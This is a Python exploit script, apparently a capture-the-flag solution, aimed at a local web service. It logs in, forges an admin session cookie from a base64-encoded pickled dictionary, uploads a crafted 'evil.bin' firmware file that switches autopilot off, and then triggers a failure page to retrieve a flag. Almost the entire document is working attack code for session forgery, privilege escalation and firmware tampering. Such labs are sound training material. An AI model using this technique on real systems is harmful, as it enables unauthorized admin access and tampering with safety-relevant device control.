import base64
import pickle
import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar

# adjust port if needed
BASE = 'http://localhost:5001'

# helper opener with cookie support
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# 1. login as l.perez to get a session cookie
opener.open(f'{BASE}/login/l.perez')
print('[+] Logged in as l.perez')

# 2. craft malicious admin cookie
payload = base64.b64encode(pickle.dumps({"username": "hacker", "role": "admin"})).decode()

# update existing cookie keeping domain and path so the server accepts it
for c in list(cj):
    if c.name == "session":
        domain, path = c.domain, c.path
        cj.clear(domain=domain, path=path, name=c.name)
        cj.set_cookie(
            http.cookiejar.Cookie(
                0,
                "session",
                payload,
                None,
                False,
                domain,
                False,
                False,
                path,
                True,
                False,
                None,
                True,
                None,
                None,
                {},
            )
        )
        break
print("[+] Replaced session cookie with admin payload")

# 3. verify access by visiting the dashboard with the forged cookie
dash = opener.open(f"{BASE}/dashboard")
print("[+] Dashboard response:\n", dash.read().decode())

# 4. upload firmware turning autopilot off
boundary = '----hydro'
data = (
    f'--{boundary}\r\n'
    'Content-Disposition: form-data; name="file"; filename="evil.bin"\r\n'
    'Content-Type: application/octet-stream\r\n\r\n'
    'autopilot: off\nwarnings: on\n'
    f'\r\n--{boundary}--\r\n'
).encode()
req = urllib.request.Request(f'{BASE}/firmware/update', data=data)
req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
resp = opener.open(req)
print('[+] Firmware upload response:', resp.read().decode())

# 5. trigger failure to obtain flag
try:
    flag_resp = opener.open(f'{BASE}/fail')
    flag_page = flag_resp.read().decode()
except urllib.error.HTTPError as e:
    flag_page = e.read().decode()
print('[+] Flag page:\n', flag_page)

